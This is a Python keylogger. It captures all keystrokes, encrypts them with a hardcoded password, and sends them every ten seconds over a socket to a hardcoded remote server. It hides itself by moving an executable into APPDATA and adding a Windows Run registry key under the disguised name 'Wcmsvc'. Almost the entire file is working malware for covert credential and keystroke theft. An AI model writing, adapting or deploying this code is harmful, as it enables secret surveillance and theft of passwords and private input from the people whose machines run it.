import keyboard
from threading import Timer
from datetime import datetime
from socket import *
from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import base64
import os

SERVER = '192.168.43.110'
PORT = 8888
LOG_INTERVAL = 10 # seconds
PASSWORD = ("password").encode()

def setWinRegKey():
    check = subprocess.Popen("REG query HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Wcmsvc", shell=True, stdout=subprocess.PIPE)
    subprocess_return = check.stdout.read()
    
    if "REG_SZ" not in str(subprocess_return):
        for root, dirs, files in os.walk("C:\\"):
            if "Wcmsvc.exe" in files:
                full_path = os.path.join(root, "Wcmsvc.exe")
                break
       
        os.rename(full_path, os.getenv('APPDATA')+'\\Wcmsvc.exe')
    
        subprocess.run('cmd /min /C "set __COMPAT_LAYER=RUNASINVOKER && start "" REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Wcmsvc /d "'+os.getenv('APPDATA')+'\\Wcmsvc.exe'+'""')

def encryptMsg(msg):
    salt = b'salt_'
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    key = base64.urlsafe_b64encode(kdf.derive(PASSWORD))
    print(msg)
    msg=msg.encode()
    f = Fernet(key)
    msg=f.encrypt(msg)
    return msg

class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def report(self):
        if self.log:
            try:
                self.send_log()
            except:
                print("[*] cannot establish connection")
        
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def send_log(self):
        clientSocket = socket(AF_INET, SOCK_STREAM)
        clientSocket.connect((SERVER, PORT))

        msg = encryptMsg(self.log)

        clientSocket.send(msg)
        print("[+] log sent")
        clientSocket.close()

    def start(self):
        try:
            keyboard.on_release(callback=self.callback)
            self.report()
            keyboard.wait()
        except KeyboardInterrupt:
            print("[-] stopping")

if __name__ == "__main__":
    setWinRegKey()
    keylogger = Keylogger(interval=LOG_INTERVAL)
    print("[+] starting")
    keylogger.start()
